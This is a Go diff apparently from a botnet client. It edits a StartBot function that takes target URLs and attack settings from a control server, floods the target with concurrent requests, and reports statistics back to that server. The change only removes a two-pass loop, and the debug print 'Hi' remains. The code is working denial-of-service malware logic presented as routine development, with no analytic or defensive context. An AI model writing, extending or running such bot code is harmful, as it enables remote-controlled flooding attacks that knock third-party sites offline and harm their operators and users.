@@ -156,28 +156,24 @@ func StartBot(serverUrl string) {
 
 	targetObject := GetTargetInfo(serverUrl)
 
-	for i := 0; i < 2; i++ {
-		if targetObject.Status && (targetObject.TargetUrl != "") {
-			var RequestInfo *ResultsObject = SendRequests(targetObject.TargetUrl,
-				targetObject.RequestNum, goRoutinesNum, targetObject.Mode, targetObject.TimeSeconds)
-			SendBotStats(serverUrl, *RequestInfo)
-		}
-
-		if !targetObject.Status {
-			fmt.Println("Server status is set to false.")
-			time.Sleep(10 * time.Second)
-		}
-
-		if targetObject.TargetUrl == "" {
-			fmt.Println("No target link specified.")
-			time.Sleep(10 * time.Second)
-		}
-
-		fmt.Println("Hi")
-		// os.Exit(0)
-
+	if targetObject.Status && (targetObject.TargetUrl != "") {
+		var RequestInfo *ResultsObject = SendRequests(targetObject.TargetUrl,
+			targetObject.RequestNum, goRoutinesNum, targetObject.Mode, targetObject.TimeSeconds)
+		SendBotStats(serverUrl, *RequestInfo)
 	}
 
+	if !targetObject.Status {
+		fmt.Println("Server status is set to false.")
+		time.Sleep(10 * time.Second)
+	}
+
+	if targetObject.TargetUrl == "" {
+		fmt.Println("No target link specified.")
+		time.Sleep(10 * time.Second)
+	}
+
+	fmt.Println("Hi")
+	// os.Exit(0)
 }
 
 func DownloadFile(filepath string, url string) error {
